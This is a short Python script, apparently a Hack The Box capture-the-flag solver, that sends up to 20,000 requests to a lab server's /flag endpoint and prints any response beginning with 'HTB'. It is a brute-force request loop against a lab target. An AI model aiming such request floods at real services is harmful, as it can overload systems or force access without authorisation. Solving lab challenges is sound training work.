import requests

for i in range(0,20000):
    x = requests.get('http://139.59.178.162:30885/flag')
    result = x.content.decode()
    if result.startswith('HTB'):
        print(result)
